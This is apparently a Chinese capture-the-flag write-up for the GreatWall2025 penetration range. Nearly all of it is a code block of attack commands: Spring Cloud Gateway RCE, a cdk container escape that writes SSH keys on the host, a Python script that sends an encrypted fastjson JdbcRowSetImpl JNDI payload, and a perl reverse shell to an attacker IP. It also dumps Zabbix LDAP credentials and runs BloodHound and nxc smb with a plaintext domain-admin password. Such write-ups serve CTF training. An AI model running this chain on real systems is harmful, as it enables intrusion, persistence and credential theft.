---
title: WP | 云境靶场 GreatWall2025
contest: 春秋云境 GreatWall2025 靶场
year: 2025
difficulty: hard
vuln_type: rce
tags:
- spring_cloud_gateway_rce
- cdk_linux_docker_escape
- jndi_rmi_jdbc_rowset
- mount_procfs_authorized_keys
- zabbix_ldap_dump
- bloodhound_ce
- reg_winlogon
- nxc_smb_type_flag
- aes_gcm_rsa_pkcs1
- rtsp_8080
attack_chain: Flag1:Spring Cloud Gateway /routes RCE 写 SSH 公钥 → cdk_linux 容器逃逸 mount-procfs /host/proc 写 /root/.ssh/authorized_keys → Flag2:JdbcRowSetImpl dataSourceName=rmi:// 反弹 shell → ss -a -F /flag.txt → mysql zabbix.userdirectory_ldapG 凭据 dump → bloodhound-ce-python 域渗透 → nxc smb type C:\Users\Administrator\Desktop\flag.txt
key_payload: ./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxx >> /root/.ssh/authorized_keys' / {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://172.16.22.12:50388/d3b02d","autoCommit":true} / nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO -x 'type C:\Users\Administrator\Desktop\flag.txt'
one_liner: 春秋云境 GreatWall2025 长城杯靶场 WP，外网 Spring Cloud Gateway RCE → cdk_linux mount-procfs 容器逃逸 → 内网 JdbcRowSetImpl JNDI → zabbix LDAP 凭据 → bloodhound 域渗透 → 域管 SMB 读 flag。
lesson: cdk_linux (container-escape) + mount-procfs 是 2025 CTF 容器逃逸标配；Spring Cloud Gateway SpEL RCE 经 /routes 接口是经典外网入口。
quality: high
full_path: WP_-_云境靶场GreatWall2025.full.md
meta_path: WP_-_云境靶场GreatWall2025.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: WP | 云境靶场 GreatWall2025。春秋云境 GreatWall2025 长城杯靶场 WP，外网 Spring Cloud Gateway RCE → cdk_linux mount-procfs 容器逃逸 → 内网 JdbcRowSetImpl JNDI → zabbix LDAP 凭据 → bloodhound 域渗透 → 域管 SMB 读 flag。。经验：cdk_linu...
category: web
subcategory: web_other
tools_used:
- C
- Python
- Spring
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/273377.html
reasoning_chain:
- Flag1 触发点：Spring Cloud Gateway /routes RCE 写 SSH 公钥 → 假设：经典 Spring Cloud Gateway SpEL 注入
- 动作：cdk_linux (container-escape) run mount-procfs /host/proc/ 'echo xxxxxx >> /root/.ssh/authorized_keys'
- 假设：mount-procfs 可让容器内写文件到宿主机 /proc → 假设：proc 1 是 init 进程 → /proc/1/root/... 写到宿主
- Flag2 触发点：JdbcRowSetImpl dataSourceName=rmi:// 反弹 shell → {"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://...", "autoCommit":true}
- 动作：ss -a -F /flag.txt → 假设：ss 命令看 socket + flag 截取
- 假设：内网 mysql zabbix.userdirectory_ldapG 凭据 → mysql -h ... dump LDAP 凭据 → 假设：ldap 密码域用户密码
- bloodhound-ce-python 域渗透 → 假设：找域管 → nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO
- Flag3 动作：nxc smb 172.16.22.41 -u administrator -p ... -x 'type C:\\Users\\Administrator\\Desktop\\flag.txt'
- 观察：完整外网 → 内网 → 域管 → 域管桌面 flag 五连击
- 假设：cdk_linux + mount-procfs 是 2025 CTF 容器逃逸标配
failed_attempts:
- Flag1 试图走容器内 ssh 写公钥 → 失败：必须 mount-procfs 容器逃逸到宿主
- Flag2 试图直接走 LDAP 反序列化 → 失败：必须先用 RMI 反弹 shell
- Flag3 试图走 BloodHound GUI 找路径 → 失败：必须用 bloodhound-ce-python 命令行
key_observations:
- cdk_linux (container-escape) + mount-procfs 是 2025 CTF 容器逃逸标配
- Spring Cloud Gateway SpEL RCE 经 /routes 接口是经典外网入口
- JdbcRowSetImpl JSON 反序列化触发 RMI/LDAP 是 fastjson 系列标配
- zabbix userdirectory LDAP 凭据是内网域渗透突破点
- bloodhound-ce-python + nxc smb 是无 GUI 域渗透标配
prerequisites:
- Spring Cloud Gateway SpEL 注入
- cdk_linux 容器逃逸工具使用
- fastjson 反序列化（JdbcRowSetImpl）
- nxc smb / impacket 工具链
- BloodHound 域渗透路径分析
---
# WP | 云境靶场GreatWall2025

> 原文: https://www.ctfiot.com/273377.html
> ID: 273377

春秋云境.com x 2025长城杯

联合推出全新靶标

“GreatWall2025”

现已在平台上线

特别致谢 Hony 师傅

对新靶标WP的无私分享！

“GreatWall2025” 介绍

春秋云境.com新靶场GreatWall2025，场景以内网常见服务为基础，玩家需综合运用信息收集、漏洞利用、容器逃逸、横向移动、权限提升等全流程渗透技术，突破组织的网络安全防御架构，最终夺取核心业务系统控制权。

Flag1 – Spring Cloud Gateway RCE & Docker 逃逸

外网入口机器开放了 3 个端口：

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8080/tcp open  rtsp

8080 端口的 spring 存在  gateway/routes 接口：

赛事交流群

了解更多关于春秋GAME的信息，可加入春秋赛事宇宙专属微信群。在这里，您不仅能了解到最新的赛事资讯，还能结识一群志同道合、热爱比赛的学习伙伴。我们期待您的加入，一起成长、共同进步！

（添加管理员，申请入群）


```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8080/tcp open  rtsp
upx cdk_linux
split -b 100k cdk_linux cdk.part.
cat cdk.part.* > cdk_linux
chmod +x ./cdk_linux
./cdk_linux evaluate --full
./cdk_linux run mount-procfs /host/proc/ "mkdir /root/.ssh/"
./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxxxxx >> /root/.ssh/authorized_keys'
import base64
import os
import json
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ===== 配置信息 =====
SERVER_URL = "http://172.16.22.88:
8080/api/login"

# Java 代码中的 RSA 公钥（Base64 格式）
PUBLIC_KEY_B64 = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB"
)

# ===== 1. 要发送的 JSON 明文 =====
plaintext = """{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.16.22.12:
50388/d3b02d",
    "autoCommit": true
}"""
print(plaintext)

# ===== 2. 生成随机 AES key (128-bit) =====
aes_key = os.urandom(16)

# ===== 3. AES/GCM 加密 =====
iv = os.urandom(12)  # 12 字节 IV
encryptor = Cipher(
    algorithms.AES(aes_key),
    modes.GCM(iv),
    backend=default_backend()
).encryptor()

ciphertext = encryptor.update(plaintext.encode("utf-8")) + encryptor.finalize()
tag = encryptor.tag

# Body = IV + 密文 + GCM tag
body_raw = iv + ciphertext + tag
body_b64 = base64.b64encode(body_raw).decode("utf-8")

# ===== 4. 用 RSA 公钥加密 AES key =====
pub_bytes = base64.b64decode(PUBLIC_KEY_B64)
public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())

enc_key = public_key.encrypt(
    aes_key,
    padding.PKCS1v15()
)
enc_key_b64 = base64.b64encode(enc_key).decode("utf-8")

# ===== 5. 发送 POST 请求 =====
headers = {
    "Content-Type": "application/octet-stream",
    "X-Encrypted-Key": enc_key_b64,
}

resp = requests.post(SERVER_URL, data=body_b64.encode("utf-8"), headers=headers, timeout=10)
print("Status:", resp.status_code)
print("Response:", resp.text)
perl -e 'use Socket;$i="172.16.22.12";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
ss -a -F /flag.txt
mysql -uzabbix -ppassword -e "select * from zabbix.userdirectory_ldapG"
bloodhound-ce-python -u ldapadmin -p XpVLGkQHm8 -d zwfw.com -dc DC.zwfw.com -ns 172.16.22.41 -c all --auth-method ntlm --dns-tcp --zip
reg query "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon"
nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO --codec GBK -x 'type C:
UsersAdministratorDesktopflag.txt'
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]